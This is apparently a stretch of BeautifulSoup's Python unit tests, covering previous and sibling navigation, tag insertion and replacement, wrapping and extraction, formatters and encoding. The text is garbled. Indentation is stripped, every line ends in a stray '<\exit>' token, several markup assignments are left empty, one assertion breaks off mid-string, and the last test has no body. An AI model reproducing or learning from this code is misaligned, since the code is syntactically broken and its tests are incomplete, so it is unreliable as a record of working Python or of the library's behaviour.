class TestPreviousOperations(ProximityTest):<\exit>
def setUp(self):<\exit>
super(TestPreviousOperations, self).setUp()<\exit>
self.end = self.tree.find(text="Three")<\exit>
def test_previous(self):<\exit>
self.assertEqual(self.end.previous_element['id'], "3")<\exit>
self.assertEqual(self.end.previous_element.previous_element, "Two")<\exit>
def test_previous_of_first_item_is_none(self):<\exit>
first = self.tree.find('html')<\exit>
self.assertEqual(first.previous_element, None)<\exit>
def test_previous_of_root_is_none(self):<\exit>
pass<\exit>
def test_find_all_previous(self):<\exit>
self.assertSelects(<\exit>
self.end.find_all_previous('b'), ["Three", "Two", "One"])<\exit>
self.assertSelects(self.end.find_all_previous(id=1), ["One"])<\exit>
def test_find_previous(self):<\exit>
self.assertEqual(self.end.find_previous('b')['id'], '3')<\exit>
self.assertEqual(self.end.find_previous(text="One"), "One")<\exit>
def test_find_previous_for_text_element(self):<\exit>
text = self.tree.find(text="Three")<\exit>
self.assertEqual(text.find_previous("b").string, "Three")<\exit>
self.assertSelects(<\exit>
text.find_all_previous("b"), ["Three", "Two", "One"])<\exit>
def test_previous_generator(self):<\exit>
start = self.tree.find(text="One")<\exit>
predecessors = [node for node in start.previous_elements]<\exit>
b, body, head, html = predecessors<\exit>
self.assertEqual(b['id'], '1')<\exit>
self.assertEqual(body.name, "body")<\exit>
self.assertEqual(head.name, "head")<\exit>
self.assertEqual(html.name, "html")<\exit>
class SiblingTest(TreeTest):<\exit>
def setUp(self):<\exit>
super(SiblingTest, self).setUp()<\exit>
markup =<\exit>
markup = re.compile("\n\s*").sub("", markup)<\exit>
self.tree = self.soup(markup)<\exit>
class TestNextSibling(SiblingTest):<\exit>
def setUp(self):<\exit>
super(TestNextSibling, self).setUp()<\exit>
self.start = self.tree.find(id="1")<\exit>
def test_next_sibling_of_root_is_none(self):<\exit>
self.assertEqual(self.tree.next_sibling, None)<\exit>
def test_next_sibling(self):<\exit>
self.assertEqual(self.start.next_sibling['id'], '2')<\exit>
self.assertEqual(self.start.next_sibling.next_sibling['id'], '3')<\exit>
self.assertEqual(self.start.next_element['id'], '1.1')<\exit>
def test_next_sibling_may_not_exist(self):<\exit>
self.assertEqual(self.tree.html.next_sibling, None)<\exit>
nested_span = self.tree.find(id="1.1")<\exit>
self.assertEqual(nested_span.next_sibling, None)<\exit>
last_span = self.tree.find(id="4")<\exit>
self.assertEqual(last_span.next_sibling, None)<\exit>
def test_find_next_sibling(self):<\exit>
self.assertEqual(self.start.find_next_sibling('span')['id'], '2')<\exit>
def test_next_siblings(self):<\exit>
self.assertSelectsIDs(self.start.find_next_siblings("span"),<\exit>
['2', '3', '4'])<\exit>
self.assertSelectsIDs(self.start.find_next_siblings(id='3'), ['3'])<\exit>
def test_next_sibling_for_text_element(self):<\exit>
soup = self.soup("Foo<b>bar</b>baz")<\exit>
start = soup.find(text="Foo")<\exit>
self.assertEqual(start.next_sibling.name, 'b')<\exit>
self.assertEqual(start.next_sibling.next_sibling, 'baz')<\exit>
self.assertSelects(start.find_next_siblings('b'), ['bar'])<\exit>
self.assertEqual(start.find_next_sibling(text="baz"), "baz")<\exit>
self.assertEqual(start.find_next_sibling(text="nonesuch"), None)<\exit>
class TestPreviousSibling(SiblingTest):<\exit>
def setUp(self):<\exit>
super(TestPreviousSibling, self).setUp()<\exit>
self.end = self.tree.find(id="4")<\exit>
def test_previous_sibling_of_root_is_none(self):<\exit>
self.assertEqual(self.tree.previous_sibling, None)<\exit>
def test_previous_sibling(self):<\exit>
self.assertEqual(self.end.previous_sibling['id'], '3')<\exit>
self.assertEqual(self.end.previous_sibling.previous_sibling['id'], '2')<\exit>
self.assertEqual(self.end.previous_element['id'], '3.1')<\exit>
def test_previous_sibling_may_not_exist(self):<\exit>
self.assertEqual(self.tree.html.previous_sibling, None)<\exit>
nested_span = self.tree.find(id="1.1")<\exit>
self.assertEqual(nested_span.previous_sibling, None)<\exit>
first_span = self.tree.find(id="1")<\exit>
self.assertEqual(first_span.previous_sibling, None)<\exit>
def test_find_previous_sibling(self):<\exit>
self.assertEqual(self.end.find_previous_sibling('span')['id'], '3')<\exit>
def test_previous_siblings(self):<\exit>
self.assertSelectsIDs(self.end.find_previous_siblings("span"),<\exit>
['3', '2', '1'])<\exit>
self.assertSelectsIDs(self.end.find_previous_siblings(id='1'), ['1'])<\exit>
def test_previous_sibling_for_text_element(self):<\exit>
soup = self.soup("Foo<b>bar</b>baz")<\exit>
start = soup.find(text="baz")<\exit>
self.assertEqual(start.previous_sibling.name, 'b')<\exit>
self.assertEqual(start.previous_sibling.previous_sibling, 'Foo')<\exit>
self.assertSelects(start.find_previous_siblings('b'), ['bar'])<\exit>
self.assertEqual(start.find_previous_sibling(text="Foo"), "Foo")<\exit>
self.assertEqual(start.find_previous_sibling(text="nonesuch"), None)<\exit>
class TestTagCreation(SoupTest):<\exit>
def test_new_tag(self):<\exit>
soup = self.soup("")<\exit>
new_tag = soup.new_tag("foo", bar="baz")<\exit>
self.assertTrue(isinstance(new_tag, Tag))<\exit>
self.assertEqual("foo", new_tag.name)<\exit>
self.assertEqual(dict(bar="baz"), new_tag.attrs)<\exit>
self.assertEqual(None, new_tag.parent)<\exit>
def test_tag_inherits_self_closing_rules_from_builder(self):<\exit>
if XML_BUILDER_PRESENT:<\exit>
xml_soup = BeautifulSoup("", "xml")<\exit>
xml_br = xml_soup.new_tag("br")<\exit>
xml_p = xml_soup.new_tag("p")<\exit>
self.assertEqual(b"<br/>", xml_br.encode())<\exit>
self.assertEqual(b"<p/>", xml_p.encode())<\exit>
html_soup = BeautifulSoup("", "html")<\exit>
html_br = html_soup.new_tag("br")<\exit>
html_p = html_soup.new_tag("p")<\exit>
self.assertEqual(b"<br/>", html_br.encode())<\exit>
self.assertEqual(b"<p></p>", html_p.encode())<\exit>
def test_new_string_creates_navigablestring(self):<\exit>
soup = self.soup("")<\exit>
s = soup.new_string("foo")<\exit>
self.assertEqual("foo", s)<\exit>
self.assertTrue(isinstance(s, NavigableString))<\exit>
class TestTreeModification(SoupTest):<\exit>
def test_attribute_modification(self):<\exit>
soup = self.soup('<a id="1"></a>')<\exit>
soup.a['id'] = 2<\exit>
self.assertEqual(soup.decode(), self.document_for('<a id="2"></a>'))<\exit>
del(soup.a['id'])<\exit>
self.assertEqual(soup.decode(), self.document_for('<a></a>'))<\exit>
soup.a['id2'] = 'foo'<\exit>
self.assertEqual(soup.decode(), self.document_for('<a id2="foo"></a>'))<\exit>
def test_new_tag_creation(self):<\exit>
builder = builder_registry.lookup('html')()<\exit>
soup = self.soup("<body></body>", builder=builder)<\exit>
a = Tag(soup, builder, 'a')<\exit>
ol = Tag(soup, builder, 'ol')<\exit>
a['href'] = 'http://foo.com/'<\exit>
soup.body.insert(0, a)<\exit>
soup.body.insert(1, ol)<\exit>
self.assertEqual(<\exit>
soup.body.encode(),<\exit>
b'<body><a href="http://foo.com/"></a><ol></ol></body>')<\exit>
def test_append_to_contents_moves_tag(self):<\exit>
doc =<\exit>
soup = self.soup(doc)<\exit>
second_para = soup.find(id='2')<\exit>
bold = soup.b<\exit>
soup.find(id='2').append(soup.b)<\exit>
self.assertEqual(bold.parent, second_para)<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for(<\exit>
'<p id="1">Don\'t leave me .</p>\n'<\exit>
'<p id="2">Don\'t leave!<b>here</b></p>'))<\exit>
def test_replace_with_returns_thing_that_was_replaced(self):<\exit>
text = "<a></a><b><c></c></b>"<\exit>
soup = self.soup(text)<\exit>
a = soup.a<\exit>
new_a = a.replace_with(soup.c)<\exit>
self.assertEqual(a, new_a)<\exit>
def test_unwrap_returns_thing_that_was_replaced(self):<\exit>
text = "<a><b></b><c></c></a>"<\exit>
soup = self.soup(text)<\exit>
a = soup.a<\exit>
new_a = a.unwrap()<\exit>
self.assertEqual(a, new_a)<\exit>
def test_replace_tag_with_itself(self):<\exit>
text = "<a><b></b><c>Foo<d></d></c></a><a><e></e></a>"<\exit>
soup = self.soup(text)<\exit>
c = soup.c<\exit>
soup.c.replace_with(c)<\exit>
self.assertEqual(soup.decode(), self.document_for(text))<\exit>
def test_replace_tag_with_its_parent_raises_exception(self):<\exit>
text = "<a><b></b></a>"<\exit>
soup = self.soup(text)<\exit>
self.assertRaises(ValueError, soup.b.replace_with, soup.a)<\exit>
def test_insert_tag_into_itself_raises_exception(self):<\exit>
text = "<a><b></b></a>"<\exit>
soup = self.soup(text)<\exit>
self.assertRaises(ValueError, soup.a.insert, 0, soup.a)<\exit>
def test_replace_with_maintains_next_element_throughout(self):<\exit>
soup = self.soup('<p><a>one</a><b>three</b></p>')<\exit>
a = soup.a<\exit>
b = a.contents[0]<\exit>
a.insert(1, "two")<\exit>
left, right = a.contents<\exit>
left.replaceWith('')<\exit>
right.replaceWith('')<\exit>
self.assertEqual("three", soup.b.string)<\exit>
def test_replace_final_node(self):<\exit>
soup = self.soup("<b>Argh!</b>")<\exit>
soup.find(text="Argh!").replace_with("Hooray!")<\exit>
new_text = soup.find(text="Hooray!")<\exit>
b = soup.b<\exit>
self.assertEqual(new_text.previous_element, b)<\exit>
self.assertEqual(new_text.parent, b)<\exit>
self.assertEqual(new_text.previous_element.next_element, new_text)<\exit>
self.assertEqual(new_text.next_element, None)<\exit>
def test_consecutive_text_nodes(self):<\exit>
soup = self.soup("<a><b>Argh!</b><c></c></a>")<\exit>
soup.b.insert(1, "Hooray!")<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for(<\exit>
"<a><b>Argh!Hooray!</b><c></c></a>"))<\exit>
new_text = soup.find(text="Hooray!")<\exit>
self.assertEqual(new_text.previous_element, "Argh!")<\exit>
self.assertEqual(new_text.previous_element.next_element, new_text)<\exit>
self.assertEqual(new_text.previous_sibling, "Argh!")<\exit>
self.assertEqual(new_text.previous_sibling.next_sibling, new_text)<\exit>
self.assertEqual(new_text.next_sibling, None)<\exit>
self.assertEqual(new_text.next_element, soup.c)<\exit>
def test_insert_string(self):<\exit>
soup = self.soup("<a></a>")<\exit>
soup.a.insert(0, "bar")<\exit>
soup.a.insert(0, "foo")<\exit>
self.assertEqual(["foo", "bar"], soup.a.contents)<\exit>
self.assertEqual(soup.a.contents[0].next_element, "bar")<\exit>
def test_insert_tag(self):<\exit>
builder = self.default_builder<\exit>
soup = self.soup(<\exit>
"<a><b>Find</b><c>lady!</c><d></d></a>", builder=builder)<\exit>
magic_tag = Tag(soup, builder, 'magictag')<\exit>
magic_tag.insert(0, "the")<\exit>
soup.a.insert(1, magic_tag)<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for(<\exit>
"<a><b>Find</b><magictag>the</magictag><c>lady!</c><d></d></a>"))<\exit>
b_tag = soup.b<\exit>
self.assertEqual(b_tag.next_sibling, magic_tag)<\exit>
self.assertEqual(magic_tag.previous_sibling, b_tag)<\exit>
find = b_tag.find(text="Find")<\exit>
self.assertEqual(find.next_element, magic_tag)<\exit>
self.assertEqual(magic_tag.previous_element, find)<\exit>
c_tag = soup.c<\exit>
self.assertEqual(magic_tag.next_sibling, c_tag)<\exit>
self.assertEqual(c_tag.previous_sibling, magic_tag)<\exit>
the = magic_tag.find(text="the")<\exit>
self.assertEqual(the.parent, magic_tag)<\exit>
self.assertEqual(the.next_element, c_tag)<\exit>
self.assertEqual(c_tag.previous_element, the)<\exit>
def test_append_child_thats_already_at_the_end(self):<\exit>
data = "<a><b></b></a>"<\exit>
soup = self.soup(data)<\exit>
soup.a.append(soup.b)<\exit>
self.assertEqual(data, soup.decode())<\exit>
def test_move_tag_to_beginning_of_parent(self):<\exit>
data = "<a><b></b><c></c><d></d></a>"<\exit>
soup = self.soup(data)<\exit>
soup.a.insert(0, soup.d)<\exit>
self.assertEqual("<a><d></d><b></b><c></c></a>", soup.decode())<\exit>
def test_insert_works_on_empty_element_tag(self):<\exit>
soup = self.soup("<br/>")<\exit>
soup.br.insert(1, "Contents")<\exit>
self.assertEqual(str(soup.br), "<br>Contents</br>")<\exit>
def test_insert_before(self):<\exit>
soup = self.soup("<a>foo</a><b>bar</b>")<\exit>
soup.b.insert_before("BAZ")<\exit>
soup.a.insert_before("QUUX")<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for("QUUX<a>foo</a>BAZ<b>bar</b>"))<\exit>
soup.a.insert_before(soup.b)<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for("QUUX<b>bar</b><a>foo</a>BAZ"))<\exit>
def test_insert_after(self):<\exit>
soup = self.soup("<a>foo</a><b>bar</b>")<\exit>
soup.b.insert_after("BAZ")<\exit>
soup.a.insert_after("QUUX")<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for("<a>foo</a>QUUX<b>bar</b>BAZ"))<\exit>
soup.b.insert_after(soup.a)<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for("QUUX<b>bar</b><a>foo</a>BAZ"))<\exit>
def test_insert_after_raises_exception_if_after_has_no_meaning(self):<\exit>
soup = self.soup("")<\exit>
tag = soup.new_tag("a")<\exit>
string = soup.new_string("")<\exit>
self.assertRaises(ValueError, string.insert_after, tag)<\exit>
self.assertRaises(NotImplementedError, soup.insert_after, tag)<\exit>
self.assertRaises(ValueError, tag.insert_after, tag)<\exit>
def test_insert_before_raises_notimplementederror_if_before_has_no_meaning(self):<\exit>
soup = self.soup("")<\exit>
tag = soup.new_tag("a")<\exit>
string = soup.new_string("")<\exit>
self.assertRaises(ValueError, string.insert_before, tag)<\exit>
self.assertRaises(NotImplementedError, soup.insert_before, tag)<\exit>
self.assertRaises(ValueError, tag.insert_before, tag)<\exit>
def test_replace_with(self):<\exit>
soup = self.soup(<\exit>
"<p>There's <b>no</b> business like <b>show</b> business</p>")<\exit>
no, show = soup.find_all('b')<\exit>
show.replace_with(no)<\exit>
self.assertEqual(<\exit>
soup.decode(),<\exit>
self.document_for(<\exit>
"<p>There's  business like <b>no</b> business</p>"))<\exit>
self.assertEqual(show.parent, None)<\exit>
self.assertEqual(no.parent, soup.p)<\exit>
self.assertEqual(no.next_element, "no")<\exit>
self.assertEqual(no.next_sibling, " business")<\exit>
def test_replace_first_child(self):<\exit>
data = "<a><b></b><c></c></a>"<\exit>
soup = self.soup(data)<\exit>
soup.b.replace_with(soup.c)<\exit>
self.assertEqual("<a><c></c></a>", soup.decode())<\exit>
def test_replace_last_child(self):<\exit>
data = "<a><b></b><c></c></a>"<\exit>
soup = self.soup(data)<\exit>
soup.c.replace_with(soup.b)<\exit>
self.assertEqual("<a><b></b></a>", soup.decode())<\exit>
def test_nested_tag_replace_with(self):<\exit>
soup = self.soup(<\exit>
)<\exit>
remove_tag = soup.b<\exit>
move_tag = soup.f<\exit>
remove_tag.replace_with(move_tag)<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for(<\exit>
"<a>We<f>refuse</f></a><e>to<g>service</g></e>"))<\exit>
self.assertEqual(remove_tag.parent, None)<\exit>
self.assertEqual(remove_tag.find(text="right").next_element, None)<\exit>
self.assertEqual(remove_tag.previous_element, None)<\exit>
self.assertEqual(remove_tag.next_sibling, None)<\exit>
self.assertEqual(remove_tag.previous_sibling, None)<\exit>
self.assertEqual(move_tag.parent, soup.a)<\exit>
self.assertEqual(move_tag.previous_element, "We")<\exit>
self.assertEqual(move_tag.next_element.next_element, soup.e)<\exit>
self.assertEqual(move_tag.next_sibling, None)<\exit>
to_text = soup.find(text="to")<\exit>
g_tag = soup.g<\exit>
self.assertEqual(to_text.next_element, g_tag)<\exit>
self.assertEqual(to_text.next_sibling, g_tag)<\exit>
self.assertEqual(g_tag.previous_element, to_text)<\exit>
self.assertEqual(g_tag.previous_sibling, to_text)<\exit>
def test_unwrap(self):<\exit>
tree = self.soup()<\exit>
tree.em.unwrap()<\exit>
self.assertEqual(tree.em, None)<\exit>
self.assertEqual(tree.p.text, "Unneeded formatting is unneeded")<\exit>
def test_wrap(self):<\exit>
soup = self.soup("I wish I was bold.")<\exit>
value = soup.string.wrap(soup.new_tag("b"))<\exit>
self.assertEqual(value.decode(), "<b>I wish I was bold.</b>")<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for("<b>I wish I was bold.</b>"))<\exit>
def test_wrap_extracts_tag_from_elsewhere(self):<\exit>
soup = self.soup("<b></b>I wish I was bold.")<\exit>
soup.b.next_sibling.wrap(soup.b)<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for("<b>I wish I was bold.</b>"))<\exit>
def test_wrap_puts_new_contents_at_the_end(self):<\exit>
soup = self.soup("<b>I like being bold.</b>I wish I was bold.")<\exit>
soup.b.next_sibling.wrap(soup.b)<\exit>
self.assertEqual(2, len(soup.b.contents))<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for(<\exit>
"<b>I like being bold.I wish I was bold.</b>"))<\exit>
def test_extract(self):<\exit>
soup = self.soup(<\exit>
'<html><body>Some content. <div id="nav">Nav crap</div> More content.</body></html>')<\exit>
self.assertEqual(len(soup.body.contents), 3)<\exit>
extracted = soup.find(id="nav").extract()<\exit>
self.assertEqual(<\exit>
soup.decode(), "<html><body>Some content.  More content.</body></html>")<\exit>
self.assertEqual(extracted.decode(), '<div id="nav">Nav crap</div>')<\exit>
self.assertEqual(len(soup.body.contents), 2)<\exit>
self.assertEqual(extracted.parent, None)<\exit>
self.assertEqual(extracted.previous_element, None)<\exit>
self.assertEqual(extracted.next_element.next_element, None)<\exit>
content_1 = soup.find(text="Some content. ")<\exit>
content_2 = soup.find(text=" More content.")<\exit>
self.assertEqual(content_1.next_element, content_2)<\exit>
self.assertEqual(content_1.next_sibling, content_2)<\exit>
self.assertEqual(content_2.previous_element, content_1)<\exit>
self.assertEqual(content_2.previous_sibling, content_1)<\exit>
def test_extract_distinguishes_between_identical_strings(self):<\exit>
soup = self.soup("<a>foo</a><b>bar</b>")<\exit>
foo_1 = soup.a.string<\exit>
bar_1 = soup.b.string<\exit>
foo_2 = soup.new_string("foo")<\exit>
bar_2 = soup.new_string("bar")<\exit>
soup.a.append(foo_2)<\exit>
soup.b.append(bar_2)<\exit>
foo_1.extract()<\exit>
bar_2.extract()<\exit>
self.assertEqual(foo_2, soup.a.string)<\exit>
self.assertEqual(bar_2, soup.b.string)<\exit>
def test_clear(self):<\exit>
soup = self.soup("<p><a>String <em>Italicized</em></a> and another</p>")<\exit>
a = soup.a<\exit>
soup.p.clear()<\exit>
self.assertEqual(len(soup.p.contents), 0)<\exit>
self.assertTrue(hasattr(a, "contents"))<\exit>
em = a.em<\exit>
a.clear(decompose=True)<\exit>
self.assertFalse(hasattr(em, "contents"))<\exit>
def test_string_set(self):<\exit>
soup = self.soup("<a></a> <b><c></c></b>")<\exit>
soup.a.string = "foo"<\exit>
self.assertEqual(soup.a.contents, ["foo"])<\exit>
soup.b.string = "bar"<\exit>
self.assertEqual(soup.b.contents, ["bar"])<\exit>
def test_string_set_does_not_affect_original_string(self):<\exit>
soup = self.soup("<a><b>foo</b><c>bar</c>")<\exit>
soup.b.string = soup.c.string<\exit>
self.assertEqual(soup.a.encode(), b"<a><b>bar</b><c>bar</c></a>")<\exit>
def test_set_string_preserves_class_of_string(self):<\exit>
soup = self.soup("<a></a>")<\exit>
cdata = CData("foo")<\exit>
soup.a.string = cdata<\exit>
self.assertTrue(isinstance(soup.a.string, CData))<\exit>
class TestElementObjects(SoupTest):<\exit>
def test_len(self):<\exit>
soup = self.soup("<top>1<b>2</b>3</top>")<\exit>
self.assertEqual(len(soup.contents), 1)<\exit>
self.assertEqual(len(soup), 1)<\exit>
self.assertEqual(len(soup.top), 3)<\exit>
self.assertEqual(len(soup.top.contents), 3)<\exit>
def test_member_access_invokes_find(self):<\exit>
soup = self.soup('<b><i></i></b>')<\exit>
self.assertEqual(soup.b, soup.find('b'))<\exit>
self.assertEqual(soup.b.i, soup.find('b').find('i'))<\exit>
self.assertEqual(soup.a, None)<\exit>
def test_deprecated_member_access(self):<\exit>
soup = self.soup('<b><i></i></b>')<\exit>
with warnings.catch_warnings(record=True) as w:<\exit>
tag = soup.bTag<\exit>
self.assertEqual(soup.b, tag)<\exit>
self.assertEqual(<\exit>
'.bTag is deprecated, use .find("b") instead.',<\exit>
str(w[0].message))<\exit>
def test_has_attr(self):<\exit>
soup = self.soup("<foo attr='bar'>")<\exit>
self.assertTrue(soup.foo.has_attr('attr'))<\exit>
self.assertFalse(soup.foo.has_attr('attr2'))<\exit>
def test_attributes_come_out_in_alphabetical_order(self):<\exit>
markup = '<b a="1" z="5" m="3" f="2" y="4"></b>'<\exit>
self.assertSoupEquals(markup, '<b a="1" f="2" m="3" y="4" z="5"></b>')<\exit>
def test_string(self):<\exit>
soup = self.soup("<b>foo</b>")<\exit>
self.assertEqual(soup.b.string, 'foo')<\exit>
def test_empty_tag_has_no_string(self):<\exit>
soup = self.soup("<b></b>")<\exit>
self.assertEqual(soup.b.string, None)<\exit>
def test_tag_with_multiple_children_has_no_string(self):<\exit>
soup = self.soup("<a>foo<b></b><b></b></b>")<\exit>
self.assertEqual(soup.b.string, None)<\exit>
soup = self.soup("<a>foo<b></b>bar</b>")<\exit>
self.assertEqual(soup.b.string, None)<\exit>
soup = self.soup("<a>foo</b>")<\exit>
soup.a.insert(1, "bar")<\exit>
self.assertEqual(soup.a.string, None)<\exit>
def test_tag_with_recursive_string_has_string(self):<\exit>
soup = self.soup("<a><b>foo</b></a>")<\exit>
self.assertEqual(soup.a.string, "foo")<\exit>
self.assertEqual(soup.string, "foo")<\exit>
def test_lack_of_string(self):<\exit>
soup = self.soup("<b>f<i>e</i>o</b>")<\exit>
self.assertFalse(soup.b.string)<\exit>
soup = self.soup("<b></b>")<\exit>
self.assertFalse(soup.b.string)<\exit>
def test_all_text(self):<\exit>
soup = self.soup("<a>a<b>r</b>   <r> t </r></a>")<\exit>
self.assertEqual(soup.a.text, "ar  t ")<\exit>
self.assertEqual(soup.a.get_text(strip=True), "art")<\exit>
self.assertEqual(soup.a.get_text(","), "a,r, , t ")<\exit>
self.assertEqual(soup.a.get_text(",", strip=True), "a,r,t")<\exit>
class TestCDAtaListAttributes(SoupTest):<\exit>
def test_single_value_becomes_list(self):<\exit>
soup = self.soup("<a class='foo'>")<\exit>
self.assertEqual(["foo"],soup.a['class'])<\exit>
def test_multiple_values_becomes_list(self):<\exit>
soup = self.soup("<a class='foo bar'>")<\exit>
self.assertEqual(["foo", "bar"], soup.a['class'])<\exit>
def test_multiple_values_separated_by_weird_whitespace(self):<\exit>
soup = self.soup("<a class='foo\tbar\nbaz'>")<\exit>
self.assertEqual(["foo", "bar", "baz"],soup.a['class'])<\exit>
def test_attributes_joined_into_string_on_output(self):<\exit>
soup = self.soup("<a class='foo\tbar'>")<\exit>
self.assertEqual(b'<a class="foo bar"></a>', soup.a.encode())<\exit>
def test_accept_charset(self):<\exit>
soup = self.soup('<form accept-charset="ISO-8859-1 UTF-8">')<\exit>
self.assertEqual(['ISO-8859-1', 'UTF-8'], soup.form['accept-charset'])<\exit>
def test_cdata_attribute_applying_only_to_one_tag(self):<\exit>
data = '<a accept-charset="ISO-8859-1 UTF-8"></a>'<\exit>
soup = self.soup(data)<\exit>
self.assertEqual('ISO-8859-1 UTF-8', soup.a['accept-charset'])<\exit>
class TestPersistence(SoupTest):<\exit>
"Testing features like pickle and deepcopy."<\exit>
def setUp(self):<\exit>
super(TestPersistence, self).setUp()<\exit>
self.page =<\exit>
self.tree = self.soup(self.page)<\exit>
def test_pickle_and_unpickle_identity(self):<\exit>
dumped = pickle.dumps(self.tree, 2)<\exit>
loaded = pickle.loads(dumped)<\exit>
self.assertEqual(loaded.__class__, BeautifulSoup)<\exit>
self.assertEqual(loaded.decode(), self.tree.decode())<\exit>
def test_deepcopy_identity(self):<\exit>
copied = copy.deepcopy(self.tree)<\exit>
self.assertEqual(copied.decode(), self.tree.decode())<\exit>
def test_unicode_pickle(self):<\exit>
html = u"<b>\N{SNOWMAN}</b>"<\exit>
soup = self.soup(html)<\exit>
dumped = pickle.dumps(soup, pickle.HIGHEST_PROTOCOL)<\exit>
loaded = pickle.loads(dumped)<\exit>
self.assertEqual(loaded.decode(), soup.decode())<\exit>
class TestSubstitutions(SoupTest):<\exit>
def test_default_formatter_is_minimal(self):<\exit>
markup = u"<b>&lt;&lt;Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!&gt;&gt;</b>"<\exit>
soup = self.soup(markup)<\exit>
decoded = soup.decode(formatter="minimal")<\exit>
self.assertEqual(<\exit>
decoded,<\exit>
self.document_for(<\exit>
u"<b>&lt;&lt;Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!&gt;&gt;</b>"))<\exit>
def test_formatter_html(self):<\exit>
markup = u"<b>&lt;&lt;Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!&gt;&gt;</b>"<\exit>
soup = self.soup(markup)<\exit>
decoded = soup.decode(formatter="html")<\exit>
self.assertEqual(<\exit>
decoded,<\exit>
self.document_for("<b>&lt;&lt;Sacr&eacute; bleu!&gt;&gt;</b>"))<\exit>
def test_formatter_minimal(self):<\exit>
markup = u"<b>&lt;&lt;Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!&gt;&gt;</b>"<\exit>
soup = self.soup(markup)<\exit>
decoded = soup.decode(formatter="minimal")<\exit>
self.assertEqual(<\exit>
decoded,<\exit>
self.document_for(<\exit>
u"<b>&lt;&lt;Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!&gt;&gt;</b>"))<\exit>
def test_formatter_null(self):<\exit>
markup = u"<b>&lt;&lt;Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!&gt;&gt;</b>"<\exit>
soup = self.soup(markup)<\exit>
decoded = soup.decode(formatter=None)<\exit>
self.assertEqual(decoded,<\exit>
self.document_for(u"<b><<Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!>></b>"))<\exit>
def test_formatter_custom(self):<\exit>
markup = u"<b>&lt;foo&gt;</b><b>bar</b>"<\exit>
soup = self.soup(markup)<\exit>
decoded = soup.decode(formatter = lambda x: x.upper())<\exit>
self.assertEqual(<\exit>
decoded,<\exit>
self.document_for(u"<b><FOO></b><b>BAR</b>"))<\exit>
def test_formatter_is_run_on_attribute_values(self):<\exit>
markup = u'<a href="http://a.com?a=b&c=">e</a>'<\exit>
soup = self.soup(markup)<\exit>
a = soup.a<\exit>
expect_minimal = u'<a href="http://a.com?a=b&amp;c=">e</a>'<\exit>
self.assertEqual(expect_minimal, a.decode())<\exit>
self.assertEqual(expect_minimal, a.decode(formatter="minimal"))<\exit>
expect_html = u'<a href="http://a.com?a=b&amp;c=&eacute;">e</a>'<\exit>
self.assertEqual(expect_html, a.decode(formatter="html"))<\exit>
self.assertEqual(markup, a.decode(formatter=None))<\exit>
expect_upper = u'<a href="HTTP://A.COM?A=B&C=">E</a>'<\exit>
self.assertEqual(expect_upper, a.decode(formatter=lambda x: x.upper()))<\exit>
def test_prettify_accepts_formatter(self):<\exit>
soup = BeautifulSoup("<html><body>foo</body></html>")<\exit>
pretty = soup.prettify(formatter = lambda x: x.upper())<\exit>
self.assertTrue("FOO" in pretty)<\exit>
def test_prettify_outputs_unicode_by_default(self):<\exit>
soup = self.soup("<a></a>")<\exit>
self.assertEqual(unicode, type(soup.prettify()))<\exit>
def test_prettify_can_encode_data(self):<\exit>
soup = self.soup("<a></a>")<\exit>
self.assertEqual(bytes, type(soup.prettify("utf-8")))<\exit>
def test_html_entity_substitution_off_by_default(self):<\exit>
markup = u"<b>Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!</b>"<\exit>
soup = self.soup(markup)<\exit>
encoded = soup.b.encode("utf-8")<\exit>
self.assertEqual(encoded, markup.encode('utf-8'))<\exit>
def test_encoding_substitution(self):<\exit>
meta_tag = ('<meta content="text/html; charset=x-sjis" '<\exit>
'http-equiv="Content-type"/>')<\exit>
soup = self.soup(meta_tag)<\exit>
self.assertEqual(soup.meta['content'], 'text/html; charset=x-sjis')<\exit>
utf_8 = soup.encode("utf-8")<\exit>
self.assertTrue(b"charset=utf-8" in utf_8)<\exit>
euc_jp = soup.encode("euc_jp")<\exit>
self.assertTrue(b"charset=euc_jp" in euc_jp)<\exit>
shift_jis = soup.encode("shift-jis")<\exit>
self.assertTrue(b"charset=shift-jis" in shift_jis)<\exit>
utf_16_u = soup.encode("utf-16").decode("utf-16")<\exit>
self.assertTrue("charset=utf-16" in utf_16_u)<\exit>
def test_encoding_substitution_doesnt_happen_if_tag_is_strained(self):<\exit>
markup = ('<head><meta content="text/html; charset=x-sjis" '<\exit>
'http-equiv="Content-type"/></head><pre>foo</pre>')<\exit>
strainer = SoupStrainer('pre')<\exit>
soup = self.soup(markup, parse_only=strainer)<\exit>
self.assertEqual(soup.contents[0].name, 'pre')<\exit>
class TestEncoding(SoupTest):<\exit>
def test_unicode_string_can_be_encoded(self):<\exit>
html = u"<b>\N{SNOWMAN}</b>"<\exit>
soup = self.soup(html)<\exit>
self.assertEqual(soup.b.string.encode("utf-8"),<\exit>
u"\N{SNOWMAN}".encode("utf-8"))<\exit>
def test_tag_containing_unicode_string_can_be_encoded(self):<\exit>
html = u"<b>\N{SNOWMAN}</b>"<\exit>
soup = self.soup(html)<\exit>
self.assertEqual(<\exit>
soup.b.encode("utf-8"), html.encode("utf-8"))<\exit>
def test_encoding_substitutes_unrecognized_characters_by_default(self):<\exit>
html = u"<b>\N{SNOWMAN}</b>"<\exit>
soup = self.soup(html)<\exit>
self.assertEqual(soup.b.encode("ascii"), b"<b>&<\exit>
def test_encoding_can_be_made_strict(self):<\exit>
html = u"<b>\N{SNOWMAN}</b>"<\exit>
soup = self.soup(html)<\exit>
self.assertRaises(<\exit>
UnicodeEncodeError, soup.encode, "ascii", errors="strict")<\exit>
def test_decode_contents(self):<\exit>
